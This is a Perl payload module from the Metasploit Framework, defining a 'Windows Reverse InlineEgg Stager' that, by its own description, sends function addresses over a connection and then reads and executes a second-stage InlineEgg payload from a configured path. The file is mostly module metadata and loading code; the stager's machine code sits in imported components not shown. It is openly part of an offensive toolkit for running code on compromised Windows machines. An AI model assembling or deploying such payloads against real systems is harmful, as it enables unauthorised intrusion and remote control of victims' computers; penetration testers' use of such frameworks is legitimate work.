
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_stg_ie;
use strict;
use base 'Msf::PayloadComponent::Windows::StagePayloadIE';
sub _Load {
  Msf::PayloadComponent::Windows::StagePayloadIE->_Import('Msf::PayloadComponent::Windows::ia32::ReverseStagerIE');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
  'Name'         => 'Windows Reverse InlineEgg Stager',
  'Version'  => '$Revision$',
  'Description'  => 'Listen for connection, send address of GP/LL across, read/exec InlineEgg',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'UserOpts'	   =>
    {
      'IEGG' => [1, 'PATH', 'Path to InlineEgg stage'],
    },
};

sub new {
  _Load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
